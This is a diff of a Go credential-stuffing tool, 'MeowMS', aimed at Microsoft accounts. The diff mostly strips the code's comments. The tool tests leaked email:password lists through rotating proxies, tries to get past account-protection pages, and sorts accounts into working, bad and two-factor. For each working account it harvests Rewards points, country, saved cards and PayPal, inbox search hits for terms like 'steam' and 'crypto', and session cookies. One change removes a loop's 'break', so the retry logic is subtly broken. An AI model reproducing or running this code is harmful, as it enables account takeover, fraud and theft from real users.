@@ -1,7 +1,3 @@
-// MeowMS — Advanced Microsoft Mail Checker v1.0
-// Built by Rivansoul | MeowMal Dev's
-// Rebuilt from: oggy.py, meow(2).py, main.py, main-7.py
-
 package main
 
 import (
@@ -33,8 +29,6 @@ import (
 	"golang.org/x/net/proxy"
 )
 
-// ─── INI Config Parser ───────────────────────────────────────────────
-
 type iniConfig map[string]map[string]string
 
 func parseINI(path string) iniConfig {
@@ -62,7 +56,7 @@ func parseINI(path string) iniConfig {
 		if idx := strings.IndexByte(line, '='); idx > 0 {
 			key := strings.TrimSpace(strings.ToLower(line[:idx]))
 			val := strings.TrimSpace(line[idx+1:])
-			// strip inline comment
+
 			if ci := strings.Index(val, " ;"); ci > 0 {
 				val = strings.TrimSpace(val[:ci])
 			}
@@ -92,8 +86,6 @@ func (c iniConfig) getInt(section, key string, def int) int {
 	return def
 }
 
-// ─── Paths ────────────────────────────────────────────────────────────
-
 const (
 	accFile    = "acc.txt"
 	proxyFile  = "proxies.txt"
@@ -109,17 +101,13 @@ const (
 	inboxDir   = "Result/Inbox"
 )
 
-// ─── Timeouts ─────────────────────────────────────────────────────────
-
 const (
-	tLogin   = 6 * time.Second  // fast-fail: ms account responds in <2s normally
+	tLogin   = 6 * time.Second
 	tReward  = 5 * time.Second
 	tInbox   = 7 * time.Second
 	tPayment = 6 * time.Second
 	tCookie  = 3 * time.Second
 )
-
-// ─── ANSI Colors ──────────────────────────────────────────────────────
 
 const (
 	cReset   = "\033[0m"
@@ -134,8 +122,6 @@ const (
 	cBold    = "\033[1m"
 )
 
-// ─── User Agents ──────────────────────────────────────────────────────
-
 var (
 	uaWinChrome = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 	uaWinEdge   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
@@ -143,7 +129,7 @@ var (
 	uaMacChrome = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 	uaIphone    = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
 	uaDesk      = uaWinEdge
-	// Mobile UAs Android 8-12
+
 	uaMobile = []string{
 		"Mozilla/5.0 (Linux; Android 8.1.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
 		"Mozilla/5.0 (Linux; Android 9; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
@@ -151,10 +137,8 @@ var (
 		"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
 		"Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
 	}
-	_ = uaWinBrave // used in config rotation
+	_ = uaWinBrave
 )
-
-// ─── Login Config ─────────────────────────────────────────────────────
 
 type loginCfg struct {
 	ua     string
@@ -174,17 +158,17 @@ func buildConfigs() []loginCfg {
 	uid2 := randUUID()
 	uid3 := randUUID()
 	return []loginCfg{
-		// 0 — Windows Chrome
+
 		{
 			ua: uaWinChrome,
 			rawURL: "https://login.live.com/ppsecure/post.srf" +
 				"?username=%7bemail%7d&client_id=0000000048170EF2" +
 				"&contextid=072929F9A0DD49A4&opid=D34F9880C21AE341" +
 				"&bk=1765024327&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216&prompt=none",
-			ppft: "-Drzud3DzKKJtVD9IfM5xwJywwEjJp5zvvJmrSyu*RKOf!PbgSCQ7ReuKFS*sIpTV5r28epGtqBhqH3JYvND4!onwSWz2JEkvdeewUQC6HmAXRgjYBzSlf0mjEYbx3ULc7oy5fUK3LDSb*CnkAG03FLzwVPmT5WjYu4sE5Wqd93pCx0USJK4jelAWNvsMog0Rmj90tmeCd*1pDYjkINyPEgQSkv6y5GPuX!GmYwKccALUt*!SRaI02p*XUqePtNtJzw$$",
+			ppft:   "-Drzud3DzKKJtVD9IfM5xwJywwEjJp5zvvJmrSyu*RKOf!PbgSCQ7ReuKFS*sIpTV5r28epGtqBhqH3JYvND4!onwSWz2JEkvdeewUQC6HmAXRgjYBzSlf0mjEYbx3ULc7oy5fUK3LDSb*CnkAG03FLzwVPmT5WjYu4sE5Wqd93pCx0USJK4jelAWNvsMog0Rmj90tmeCd*1pDYjkINyPEgQSkv6y5GPuX!GmYwKccALUt*!SRaI02p*XUqePtNtJzw$$",
 			cookie: "MSPRequ=id=N&lt=1765024327&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-90ce4cdb-2718-4d7e-9889-4136cfacc5b2; OParams=11O.DhmByHnT9kscyud7VyWQt5uWQuQOYWZ9O2v5E49mKxVoKsSZaB4KnwkAQCVjghW9A6M8syem4sO!g4KOfietehdD7U2eXeVo8eUsorIQv1deGf6v43egdNizv1*agwrVh2OTg7pu2SRE3SougNTvzlNUNe1BgtO4HFlLRm6UoEW3PNBIxuVPmFBiPs0wEU162jlfO8yA1!QZV7KKArG8NPChj0kf1IOfR95k0fIfa0!fDW8Md44pKHa3rkU0Um0KB03YEBdWMOAbJlX5RONIL3M31WhD4LG3GPAoBPAMCN9fMk2rHlwix8g6MOW3HKxDT4I0TlKrYHDBJejZWSmI23T3v2kr1MKaL9vEQoaTwOJf9VloMFBi7yB!kisHZn0BkjE!HGWhaliwYdluhJUCu1g$",
 		},
-		// 1 — Windows Edge
+
 		{
 			ua: uaWinEdge,
 			rawURL: "https://login.live.com/ppsecure/post.srf" +
@@ -194,7 +178,7 @@ func buildConfigs() []loginCfg {
 			ppft:   "-Dm65IQ!FOoxUaTQnZAHxYJMOmOcAmTQz4qm3kTra6EWGgOJS3HmmMLM4kwOpB*SxcpnorGvu6Meyzvos0ruiOkVKAh!SdkWlD5KUiiUUpVaBaRmY4op*aKCNkOPi2mBbWnS0mXOvSG7dMuL!5HdVFTPtGTdlQZCucF7LVMbr2BWN6qhWxoXXrBMfvx3BcxGFhNZgbDooHcWy8QO4OOYEXVI2ee3UOWa!S2qTtgO3nriTV67BP7!q8QgpyDMkckNSHQ$$",
 			cookie: "MSFPC=GUID=cd3df40453784149a05eb0e8d7b0aaf5&HASH=cd3d&LV=202510&V=4&LU=1761393873491; MUID=009CC129162F6E173020D77717446F0A; uaid=b1d1e6fbf8b24f9b8a73b347b178d580; MSPRequ=id=N&lt=1768757278&co=1; MSPOK=$uuid-" + uid1,
 		},
-		// 2 — Mac Chrome / Xbox
+
 		{
 			ua: uaMacChrome,
 			rawURL: "https://login.live.com/ppsecure/post.srf" +
@@ -204,7 +188,7 @@ func buildConfigs() []loginCfg {
 			ppft:   "-DxY9Z*wV4U!tS8rQ3p2NmLkJiHgFeDcBaZyXwVuTsRqPoNnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCbAzYxWvUtSrQpOnMlKjIhGfEdCb$$",
 			cookie: "MSFPC=GUID=" + randHex(16) + "&HASH=ab12&LV=202503&V=4; MUID=" + strings.ToUpper(randHex(16)) + "; uaid=c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8; MSPRequ=id=N&lt=1760000001&co=1; MSPOK=$uuid-" + uid2,
 		},
-		// 3 — Android Mobile
+
 		{
 			ua: uaMobile[rand.Intn(len(uaMobile))],
 			rawURL: "https://login.live.com/ppsecure/post.srf" +
@@ -224,8 +208,6 @@ func buildConfigs() []loginCfg {
 		},
 	}
 }
-
-// ─── Stats ────────────────────────────────────────────────────────────
 
 var (
 	statHits    int64
@@ -266,8 +248,6 @@ func updateTitle() {
 	fmt.Printf("\033]0;%s\007", s)
 }
 
-// ─── Helpers ──────────────────────────────────────────────────────────
-
 var rng = rand.New(rand.NewSource(time.Now().UnixNano()))
 
 func randHex(n int) string {
@@ -291,8 +271,6 @@ func elapsed() string {
 	s := int(d.Seconds()) % 60
 	return fmt.Sprintf("%02d:%02d:%02d", h, m, s)
 }
-
-// ─── Proxy Manager ────────────────────────────────────────────────────
 
 type proxyData struct {
 	hits  []time.Time
@@ -372,7 +350,6 @@ func pickProxy(proxies []string) string {
 	return proxies[rng.Intn(len(proxies))]
 }
 
-// cfgOrder returns config indices sorted by least rate-limiting
 func cfgOrder() []int {
 	cfgLock.Lock()
 	defer cfgLock.Unlock()
@@ -396,8 +373,6 @@ func recordToomany(i int) {
 	}
 	cfgToomany[i]++
 }
-
-// ─── HTTP Client Factory ──────────────────────────────────────────────
 
 func newClient(proxyURL string, ua string) *http.Client {
 	jar, _ := cookiejar.New(nil)
@@ -523,8 +498,6 @@ func doPostJSON(client *http.Client, rawURL string, payload interface{}, hdrs ma
 	return resp, string(body), nil
 }
 
-// ─── Cookie Helpers ───────────────────────────────────────────────────
-
 func getCookie(client *http.Client, name string) string {
 	u, _ := url.Parse("https://login.live.com")
 	for _, c := range client.Jar.Cookies(u) {
@@ -532,7 +505,7 @@ func getCookie(client *http.Client, name string) string {
 			return c.Value
 		}
 	}
-	// try microsoft.com
+
 	u2, _ := url.Parse("https://account.microsoft.com")
 	for _, c := range client.Jar.Cookies(u2) {
 		if c.Name == name {
@@ -566,8 +539,6 @@ func allCookies(client *http.Client) []*http.Cookie {
 	return out
 }
 
-// ─── Fresh PPFT Fetch ─────────────────────────────────────────────────
-
 type ppftResult struct {
 	urlPost string
 	ppft    string
@@ -597,7 +568,7 @@ func getFreshPPFT(email, proxyURL string) *ppftResult {
 		if err != nil || resp.StatusCode != 200 {
 			continue
 		}
-		// Extract urlPost
+
 		var urlPost string
 		for _, marker := range []string{`"urlPost":"`, `'urlPost':'`} {
 			if idx := strings.Index(body, marker); idx >= 0 {
@@ -615,7 +586,7 @@ func getFreshPPFT(email, proxyURL string) *ppftResult {
 		if urlPost == "" {
 			continue
 		}
-		// Extract PPFT
+
 		var ppft string
 		patterns := []struct{ start, end string }{
 			{`name=\"PPFT\" id=\"i0327\" value=\"`, `\"`},
@@ -636,7 +607,7 @@ func getFreshPPFT(email, proxyURL string) *ppftResult {
 		if ppft == "" {
 			continue
 		}
-		// Build cookie string from response
+
 		var parts []string
 		cookieURL, _ := url.Parse("https://login.live.com")
 		for _, c := range client.Jar.Cookies(cookieURL) {
@@ -659,23 +630,19 @@ func getFreshPPFT(email, proxyURL string) *ppftResult {
 	return nil
 }
 
-// ─── Login Result Types ───────────────────────────────────────────────
-
 type loginResult int
 
 const (
-	lrBad    loginResult = iota // wrong creds
-	lrTwoFA                     // 2FA / blocked
-	lrRotate                    // transient, try next config
-	lrHit                       // success
+	lrBad loginResult = iota
+	lrTwoFA
+	lrRotate
+	lrHit
 )
 
 type hitResult struct {
 	client *http.Client
-	token  string // access_token (may be empty)
+	token  string
 }
-
-// ─── Single Login Attempt ─────────────────────────────────────────────
 
 func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua string, cfgIdx int, proxyURL string) (loginResult, *hitResult) {
 	form := url.Values{
@@ -692,22 +659,22 @@ func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua st
 		"passwd": {password},
 	}
 	hdrs := map[string]string{
-		"Cookie":                  cookie,
-		"User-Agent":              ua,
-		"Referer":                 "https://login.live.com/",
-		"Origin":                  "https://login.live.com",
-		"Accept":                  "text/html,application/xhtml+xml,*/*;q=0.8",
-		"Accept-Language":         "en-US,en;q=0.9",
-		"Accept-Encoding":         "gzip, deflate",
-		"Sec-Fetch-Dest":          "document",
-		"Sec-Fetch-Mode":          "navigate",
-		"Sec-Fetch-Site":          "same-origin",
+		"Cookie":                    cookie,
+		"User-Agent":                ua,
+		"Referer":                   "https://login.live.com/",
+		"Origin":                    "https://login.live.com",
+		"Accept":                    "text/html,application/xhtml+xml,*/*;q=0.8",
+		"Accept-Language":           "en-US,en;q=0.9",
+		"Accept-Encoding":           "gzip, deflate",
+		"Sec-Fetch-Dest":            "document",
+		"Sec-Fetch-Mode":            "navigate",
+		"Sec-Fetch-Site":            "same-origin",
 		"Upgrade-Insecure-Requests": "1",
 	}
 	c429, c5xx, toomany, maxIter := 0, 0, 0, 0
 	for {
 		maxIter++
-		if maxIter > 8 { // hard cap — never spin forever
+		if maxIter > 8 {
 			return lrRotate, nil
 		}
 		resp, body, err := doPost(client, loginURL, form, hdrs, tLogin, true)
@@ -717,13 +684,13 @@ func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua st
 		code := resp.StatusCode
 		if code == 429 {
 			c429++
-			if c429 >= 2 { // bail faster on rate-limit
+			if c429 >= 2 {
 				recordToomany(cfgIdx)
 				prxHit(proxyURL)
 				return lrRotate, nil
 			}
 			prxHit(proxyURL)
-			time.Sleep(500 * time.Millisecond) // short sleep, move on fast
+			time.Sleep(500 * time.Millisecond)
 			continue
 		}
 		if code >= 500 {
@@ -744,12 +711,12 @@ func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua st
 		if strings.Contains(loc, "srf?code=") || strings.Contains(loc, "oauth20_desktop.srf?") {
 			return lrHit, &hitResult{client: client}
 		}
-		// Check cookies for success
+
 		if getCookie(client, "ANON") != "" || getCookie(client, "WLSSC") != "" {
 			return lrHit, &hitResult{client: client}
 		}
 		bodyL := strings.ToLower(body)
-		// Too many times
+
 		toomanyKws := []string{
 			"you have tried too many times", "tried too many",
 			"too many incorrect password", ",ac:null,",
@@ -760,12 +727,12 @@ func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua st
 			recordToomany(cfgIdx)
 			prxHit(proxyURL)
 			toomany++
-			if toomany >= 1 { // rotate immediately on toomany
+			if toomany >= 1 {
 				return lrRotate, nil
 			}
 			continue
 		}
-		// Bad credentials
+
 		badKws := []string{
 			"your account or password is incorrect", "password is incorrect",
 			"that microsoft account doesn't exist", "account doesn't exist",
@@ -776,7 +743,7 @@ func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua st
 		if containsAny(bodyL, badKws) {
 			return lrBad, nil
 		}
-		// 2FA / blocked
+
 		tfaKws := []string{
 			"two-step verification", "two-step", "two factor",
 			"verify your identity", "verification code",
@@ -792,7 +759,7 @@ func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua st
 		if containsAny(bodyL, tfaKws) || containsAny(body, tfaRaw) {
 			return lrTwoFA, nil
 		}
-		// Bypass interstitials
+
 		if strings.Contains(body, "account.live.com/proofs/Add") || strings.Contains(body, "account.live.com/proofs/add") {
 			bypassProofs(client, body)
 			return lrHit, &hitResult{client: client}
@@ -806,7 +773,7 @@ func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua st
 				return lrHit, &hitResult{client: client}
 			}
 		}
-		// Explicit success
+
 		successKws := []string{
 			"account.microsoft.com", "signout?", "Sign out", "/SignOut",
 			"profile.live.com", "sSigninName", "www.xbox.com/en-US/",
@@ -815,7 +782,7 @@ func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua st
 		if containsAny(body, successKws) {
 			return lrHit, &hitResult{client: client}
 		}
-		// Redirect success
+
 		if code >= 301 && code <= 308 {
 			redirectSuccessKws := []string{"account.microsoft.com", "outlook.live.com", "www.bing.com", "www.xbox.com"}
 			if containsAny(loc, redirectSuccessKws) {
@@ -826,11 +793,8 @@ func attempt(client *http.Client, email, password, loginURL, ppft, cookie, ua st
 	}
 }
 
-// ─── Main Login Orchestrator ──────────────────────────────────────────
-// Speed: use static configs first (no extra HTTP roundtrip), fresh PPFT only as last resort
-
 func doLogin(email, password string, proxies []string, configs []loginCfg) (loginResult, *hitResult) {
-	// 1. Rotate static configs (fast — no extra HTTP roundtrip)
+
 	for _, i := range cfgOrder() {
 		if i >= len(configs) {
 			continue
@@ -849,7 +813,7 @@ func doLogin(email, password string, proxies []string, configs []loginCfg) (logi
 			time.Sleep(time.Duration(150+rng.Intn(300)) * time.Millisecond)
 		}
 	}
-	// 2. Fresh PPFT fallback (slower but more reliable)
+
 	prx2 := pickProxy(proxies)
 	fresh := getFreshPPFT(email, prx2)
 	if fresh != nil {
@@ -859,11 +823,9 @@ func doLogin(email, password string, proxies []string, configs []loginCfg) (logi
 			return lr, hr
 		}
 	}
-	// All paths exhausted
+
 	return lrRotate, nil
 }
-
-// ─── Bypass Handlers ──────────────────────────────────────────────────
 
 func extractHidden(body, name string) string {
 	patterns := []string{
@@ -985,8 +947,6 @@ func bypassUpdate(client *http.Client, body string) bool {
 	return err == nil && resp.StatusCode == 200
 }
 
-// ─── Silent Token ─────────────────────────────────────────────────────
-
 func silentToken(client *http.Client, clientID, scope, redirectURI string, timeout time.Duration) string {
 	params := url.Values{
 		"client_id":     {clientID},
@@ -1001,7 +961,7 @@ func silentToken(client *http.Client, clientID, scope, redirectURI string, timeo
 	if err != nil {
 		return ""
 	}
-	// Check final URL fragment
+
 	if resp.Request != nil {
 		finalURL := resp.Request.URL.String()
 		if tok := extractParam(finalURL+"#"+resp.Header.Get("Location"), "access_token"); tok != "" {
@@ -1016,7 +976,7 @@ func extractParam(rawURL, param string) string {
 	for _, sep := range []string{"?", "#", "&"} {
 		_ = sep
 	}
-	// Try as URL fragment and query
+
 	for _, part := range strings.Split(rawURL, "#") {
 		vals, err := url.ParseQuery(part)
 		if err == nil {
@@ -1025,7 +985,7 @@ func extractParam(rawURL, param string) string {
 			}
 		}
 	}
-	// Fallback: manual split
+
 	marker := param + "="
 	if idx := strings.Index(rawURL, marker); idx >= 0 {
 		rest := rawURL[idx+len(marker):]
@@ -1037,8 +997,6 @@ func extractParam(rawURL, param string) string {
 	}
 	return ""
 }
-
-// ─── String Helpers ───────────────────────────────────────────────────
 
 func containsAny(s string, subs []string) bool {
 	for _, sub := range subs {
@@ -1061,8 +1019,6 @@ func between(s, start, end string) string {
 	}
 	return s[:ei]
 }
-
-// ─── JWT Decode ───────────────────────────────────────────────────────
 
 func decodeJWT(token string) map[string]interface{} {
 	parts := strings.Split(token, ".")
@@ -1087,8 +1043,6 @@ func decodeJWT(token string) map[string]interface{} {
 	json.Unmarshal(data, &out)
 	return out
 }
-
-// ─── Rewards Checker ──────────────────────────────────────────────────
 
 func checkRewards(client *http.Client) int {
 	hdr := map[string]string{"User-Agent": uaDesk, "Pragma": "no-cache", "Accept": "*/*"}
@@ -1120,7 +1074,7 @@ func checkRewards(client *http.Client) int {
 			return best
 		}
 	}
-	// Flyout fallback
+
 	doGet(client, "https://www.bing.com/", map[string]string{"User-Agent": uaDesk}, 5*time.Second)
 	ts := time.Now().UnixMilli()
 	flyURL := fmt.Sprintf("https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp=%d", ts)
@@ -1145,15 +1099,13 @@ func checkRewards(client *http.Client) int {
 	return 0
 }
 
-// ─── Profile from JWT Cookie ──────────────────────────────────────────
-
 type profile struct {
 	Name    string
 	Country string
 }
 
 func getProfile(client *http.Client) profile {
-	// Warm account.microsoft.com
+
 	doGet(client, "https://account.microsoft.com/", map[string]string{"User-Agent": uaDesk}, tCookie)
 	jwt := getCookie(client, "AMCSecAuthJWT")
 	if jwt != "" {
@@ -1181,8 +1133,6 @@ func getProfile(client *http.Client) profile {
 	}
 	return profile{}
 }
-
-// ─── Payment Checker ──────────────────────────────────────────────────
 
 func checkPayment(client *http.Client) (cards, paypals int) {
 	tok := silentToken(client, "000000000004773A",
@@ -1227,7 +1177,7 @@ func checkPayment(client *http.Client) (cards, paypals int) {
 			}
 		}
 	}
-	// Billing page fallback
+
 	doGet(client, "https://account.microsoft.com/", map[string]string{"User-Agent": uaDesk}, tCookie)
 	_, body2, err := doGet(client,
 		"https://account.microsoft.com/billing/payments",
@@ -1264,8 +1214,6 @@ func fmtPayment(cards, paypals int) string {
 	return "[" + strings.Join(parts, ", ") + "]"
 }
 
-// ─── Inbox Checker ────────────────────────────────────────────────────
-
 func checkInbox(client *http.Client, email string, keywords []string, domainFilters []string) map[string]int {
 	if len(keywords) == 0 {
 		return nil
@@ -1291,18 +1239,18 @@ func checkInbox(client *http.Client, email string, keywords []string, domainFilt
 		return nil
 	}
 	hdrs := map[string]string{
-		"Authorization":    "Bearer " + tok,
+		"Authorization":   "Bearer " + tok,
 		"X-AnchorMailbox": "CID:" + cid,
 		"Content-Type":    "application/json",
 		"User-Agent":      "Outlook-Android/2.0",
 		"Accept":          "application/json",
 		"Host":            "substrate.office.com",
 	}
-	// Merge keywords + domain filters into one search list
+
 	allQueries := make([]string, 0, len(keywords)+len(domainFilters))
 	allQueries = append(allQueries, keywords...)
 	for _, d := range domainFilters {
-		// Strip leading '@' — Outlook search expects 'from:domain.ca', not 'from:@domain.ca'
+
 		domainQ := "from:" + strings.TrimPrefix(d, "@")
 		allQueries = append(allQueries, domainQ)
 	}
@@ -1321,12 +1269,12 @@ func checkInbox(client *http.Client, email string, keywords []string, domainFilt
 					{"Term": map[string]string{"DistinguishedFolderName": "msgfolderroot"}},
 					{"Term": map[string]string{"DistinguishedFolderName": "DeletedItems"}},
 				}},
-				"From":              0,
-				"Query":             map[string]string{"QueryString": kw},
-				"RefiningQueries":   nil,
-				"Size":              25,
-				"EnableTopResults":  true,
-				"TopResultsCount":   3,
+				"From":             0,
+				"Query":            map[string]string{"QueryString": kw},
+				"RefiningQueries":  nil,
+				"Size":             25,
+				"EnableTopResults": true,
+				"TopResultsCount":  3,
 			}},
 			"AnswerEntityRequests":   []interface{}{},
 			"QueryAlterationOptions": map[string]bool{"EnableSuggestion": true, "EnableAlteration": true},
@@ -1365,8 +1313,6 @@ func checkInbox(client *http.Client, email string, keywords []string, domainFilt
 	}
 	return results
 }
-
-// ─── Cookie Save System ───────────────────────────────────────────────
 
 var (
 	skipCookies  = map[string]bool{"MSPAuth": true, "MSPProf": true, "MSPSoftVis": true, "MSPBack": true}
@@ -1502,12 +1448,9 @@ func zipCookies() {
 	_ = os.RemoveAll(cookiesDir)
 }
 
-// ─── Country Sorter ───────────────────────────────────────────────────
-// Uses in-memory seen-set per country file to avoid reading files on every hit
-
 var (
 	countryLock sync.Mutex
-	countrySeen = map[string]map[string]bool{} // country -> set of emails
+	countrySeen = map[string]map[string]bool{}
 )
 
 func saveCountry(email, password, country string) {
@@ -1533,8 +1476,6 @@ func saveCountry(email, password, country string) {
 		f.Close()
 	}
 }
-
-// ─── Dedup File Writer ────────────────────────────────────────────────
 
 var fileLock sync.Mutex
 
@@ -1564,8 +1505,6 @@ func appendLine(fpath, line string) {
 	}
 }
 
-// ─── Inbox Directory Writer ───────────────────────────────────────────
-
 var inboxLock sync.Mutex
 
 func saveInbox(email, password string, hits map[string]int) {
@@ -1584,13 +1523,13 @@ func saveInbox(email, password string, hits map[string]int) {
 	for _, kw := range matched {
 		var fname string
 		if strings.HasPrefix(kw, "from:") {
-			// Domain filter hit — save to domains/ subfolder with clean domain name
+
 			os.MkdirAll(domainsDir, 0755)
 			domainName := strings.TrimPrefix(kw, "from:")
 			safe := regexp.MustCompile(`[^a-zA-Z0-9_\.\-]`).ReplaceAllString(domainName, "_")
 			fname = filepath.Join(domainsDir, safe+".txt")
 		} else {
-			// Keyword hit — save to inbox root
+
 			safe := regexp.MustCompile(`[^a-zA-Z0-9_\- ]`).ReplaceAllString(kw, "")
 			fname = filepath.Join(inboxDir, safe+".txt")
 		}
@@ -1605,29 +1544,27 @@ func saveInbox(email, password string, hits map[string]int) {
 	}
 }
 
-// ─── Per-Account Processor ────────────────────────────────────────────
-
 func processAccount(email, password string, proxies []string, keywords []string, domainFilters []string, configs []loginCfg, retries int) {
-	// Panic recovery — one bad account must never kill the whole worker
+
 	defer func() {
 		if r := recover(); r != nil {
 			incrBad()
 			incrChecked()
 		}
 	}()
-	// Retry loop: on transient rate-limit (lrRotate), retry up to retries times
+
 	var lr loginResult
 	var hr *hitResult
 	for attempt := 0; attempt <= retries; attempt++ {
 		lr, hr = doLogin(email, password, proxies, configs)
 		if lr != lrRotate {
-			break // definitive result (hit / bad / 2fa)
+
 		}
 		if attempt < retries {
-			time.Sleep(200 * time.Millisecond) // minimal backoff — don't stall workers
+			time.Sleep(200 * time.Millisecond)
 		}
 	}
-	// If still rotating after all retries, count as bad (unresolvable)
+
 	if lr == lrRotate {
 		lr = lrBad
 	}
@@ -1656,20 +1593,15 @@ func processAccount(email, password string, proxies []string, keywords []string,
 	if lr == lrHit && hr != nil {
 		incrHits()
 
-		// 1. Rewards
 		pts := checkRewards(hr.client)
 
-		// 2. Profile
 		prof := getProfile(hr.client)
 
-		// 3. Payment Methods
 		cards, paypals := checkPayment(hr.client)
 		payStr := fmtPayment(cards, paypals)
 
-		// 4. Inbox Search
 		inboxHits := checkInbox(hr.client, email, keywords, domainFilters)
 
-		// Build formatted captures
 		var capParts []string
 		if prof.Name != "" {
 			capParts = append(capParts, "Name: "+prof.Name)
@@ -1696,11 +1628,9 @@ func processAccount(email, password string, proxies []string, keywords []string,
 			capStr = " | " + strings.Join(capParts, " | ")
 		}
 
-		// Save Hit
 		hitLine := fmt.Sprintf("%s:%s\n", email, password)
 		writeDedup(msFile, hitLine)
 
-		// Specific logs
 		if pts > 0 {
 			writeDedup(ptsFile, fmt.Sprintf("%s:%s | %d pts\n", email, password, pts))
 		}
@@ -1708,18 +1638,14 @@ func processAccount(email, password string, proxies []string, keywords []string,
 			writeDedup(payFile, fmt.Sprintf("%s:%s | %s\n", email, password, payStr))
 		}
 
-		// Inbox save
 		if len(inboxHits) > 0 {
 			saveInbox(email, password, inboxHits)
 		}
 
-		// Save Cookies
 		saveCookies(email, hr.client)
 
-		// Country sort
 		saveCountry(email, password, prof.Country)
 
-		// Print glowing hit
 		printLock.Lock()
 		ctryPart := ""
 		if prof.Country != "" {
@@ -1730,13 +1656,10 @@ func processAccount(email, password string, proxies []string, keywords []string,
 	}
 }
 
-// ─── Main Orchestrator ────────────────────────────────────────────────
-
 func main() {
-	runtime.GOMAXPROCS(runtime.NumCPU()) // use all CPU cores for max throughput
+	runtime.GOMAXPROCS(runtime.NumCPU())
 	startTime = time.Now()
 
-	// ASCII banner
 	banner := fmt.Sprintf(`%s
 ███╗   ███╗███████╗ ██████╗ ██╗    ██╗███╗   ███╗███████╗
 ████╗ ████║██╔════╝██╔═══██╗██║    ██║████╗ ████║██╔════╝
@@ -1750,11 +1673,9 @@ func main() {
 
 	fmt.Print(banner)
 
-	// Create directories
 	os.MkdirAll(resultDir, 0755)
 	os.MkdirAll(countryDir, 0755)
 
-	// 1. Load accounts
 	var accounts [][2]string
 	fAcc, err := os.Open(accFile)
 	if err != nil {
@@ -1797,7 +1718,6 @@ func main() {
 	statTotal = int64(totalAccs)
 	fmt.Printf("[%s*%s] Loaded %s%d%s unique accounts.\n", cCyan, cReset, cBold, totalAccs, cReset)
 
-	// 2. Load proxies
 	var proxies []string
 	fPrx, err := os.Open(proxyFile)
 	if err == nil {
@@ -1819,7 +1739,6 @@ func main() {
 		fmt.Printf("[%s*%s] Loaded %s%d%s proxies.\n", cCyan, cReset, cBold, len(proxies), cReset)
 	}
 
-	// 3. Load search keywords
 	var keywords []string
 	fInb, err := os.Open(inboxFile)
 	if err == nil {
@@ -1836,20 +1755,17 @@ func main() {
 		fInb.Close()
 	}
 	if len(keywords) == 0 {
-		// Default common keywords fallback
+
 		keywords = []string{"epicgames", "steam", "playstation", "roblox", "minecraft", "paypal", "crypto"}
 		fmt.Printf("[%s*%s] No keywords loaded. Using common defaults.\n", cYellow, cReset)
 	} else {
 		fmt.Printf("[%s*%s] Loaded %s%d%s search keywords.\n", cCyan, cReset, cBold, len(keywords), cReset)
 	}
 
-	// Pre-generate configs
 	configs := buildConfigs()
 
-	// ── Load config.ini ──────────────────────────────────────────────
 	cfg := parseINI("config.ini")
 
-	// Thread count (default 150 for 1k+ CPM; scale with proxy count)
 	numWorkers := cfg.getInt("checker", "threads", 150)
 	if numWorkers < 1 {
 		numWorkers = 150
@@ -1858,13 +1774,11 @@ func main() {
 		numWorkers = totalAccs
 	}
 
-	// Retry count
 	numRetries := cfg.getInt("checker", "retries", 2)
 	if numRetries < 0 {
 		numRetries = 0
 	}
 
-	// Domain filters from config.ini [inbox] domain_filter
 	var domainFilters []string
 	if df := cfg.get("inbox", "domain_filter", ""); df != "" {
 		for _, d := range strings.Split(df, ",") {
@@ -1875,9 +1789,8 @@ func main() {
 		}
 	}
 
-	// Keywords: ALWAYS prefer config.ini [inbox] keywords; inbox.txt is secondary
 	if ck := cfg.get("inbox", "keywords", ""); ck != "" {
-		keywords = nil // reset; config takes priority
+		keywords = nil
 		for _, k := range strings.Split(ck, ",") {
 			k = strings.TrimSpace(k)
 			if k != "" {
@@ -1891,7 +1804,6 @@ func main() {
 		fmt.Printf("[%s*%s] Domain filters: %s%d%s domains loaded.\n", cCyan, cReset, cBold, len(domainFilters), cReset)
 	}
 
-	// Lines-per-agent split info
 	linesPerAgent := 1000
 	if numWorkers > 0 {
 		linesPerAgent = totalAccs / numWorkers
@@ -1915,9 +1827,9 @@ func main() {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			defer func() { // goroutine-level crash guard
+			defer func() {
 				if r := recover(); r != nil {
-					// drain remaining jobs so wg doesn't hang
+
 					for range jobs {
 						incrBad()
 						incrChecked()
@@ -1930,7 +1842,6 @@ func main() {
 		}()
 	}
 
-	// Stats logger in background — keeps title updated without polluting the console log
 	stopStats := make(chan struct{})
 	go func() {
 		ticker := time.NewTicker(2 * time.Second)
@@ -1952,7 +1863,6 @@ func main() {
 
